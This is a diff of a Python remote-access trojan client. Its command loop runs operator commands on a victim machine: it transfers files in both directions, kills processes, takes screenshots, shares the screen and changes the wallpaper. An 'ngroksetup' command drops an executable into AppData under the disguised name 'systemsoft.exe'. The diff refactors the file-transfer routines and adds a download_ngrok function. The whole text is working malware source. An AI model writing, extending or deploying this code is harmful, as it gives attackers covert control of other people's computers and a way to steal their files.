@@ -51,6 +51,7 @@ def wallpaper():
     SPI_SETDESKWALLPAPER = 20
     WALLPAPER_PATH = appd+'\\wallpaper.jpg'
 
+
     def is_64_windows():
         return struct.calcsize('P') * 8 == 64
 
@@ -574,6 +575,26 @@ def reliable_recv():
             continue
 
 def download_file(file_name):
+
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    if chunk.decode() == "fnfound":
+        s.send("[-] file not found".encode())
+        s.settimeout(None)
+    else:
+        while chunk:
+            f.write(chunk)
+            try:
+                chunk = s.recv(1024)
+            except Exception as e:
+                break
+
+        s.settimeout(None)
+        f.close()
+
+def download_ngrok(file_name):
+
     f = open(file_name, 'wb')
     s.settimeout(1)
     chunk = s.recv(1024)
@@ -589,13 +610,12 @@ def download_file(file_name):
 
 
 
-def upload_file(file_name):
-    if isfile(file_name) == True:
 
+
+def upload_file(file_name):
         f = open(file_name, 'rb')
         s.send(f.read())
-    else:
-        reliable_send('didn t find the file')
+        f.close()
 
 
 def screenshot():
@@ -654,7 +674,6 @@ def shell():
                         reliable_send('Directory Not Found')
                         continue
                 elif command[:10] == 'cwallpaper':
-                    reliable_send('changed wallpaper')
                     wallpaper()
 
                 elif command[:7] == 'appdata':
@@ -665,15 +684,16 @@ def shell():
                         reliable_send('[-]Error')
 
                 elif command[:6] == 'upload':
-                    try:
                         download_file(command[7:])
-                    except:
-                        continue
+
                 elif command[:4] == 'kill':
                     killprocess(command[5:])
                 elif command[:8] == 'download':
                     try:
-                        upload_file(command[9:])
+                        if isfile(command[9:]) == True:
+                            upload_file(command[9:])
+                        else:
+                            s.send('fnfound'.encode())
                     except:
                         continue
                 elif command == 'back':
@@ -823,8 +843,8 @@ def shell():
                 elif command[:11] == 'screenshare':
                     threading.Thread(target=screenshare())
                 elif command == 'ngroksetup':
-                    download_file(appd + '\\systemsoft.exe')
-                    reliable_send('[+] ngrok installed')
+
+                    download_ngrok(appd + '\\systemsoft.exe')
                 elif command[:7] == 'sysinfo':
                     try:
                         sysinfo()
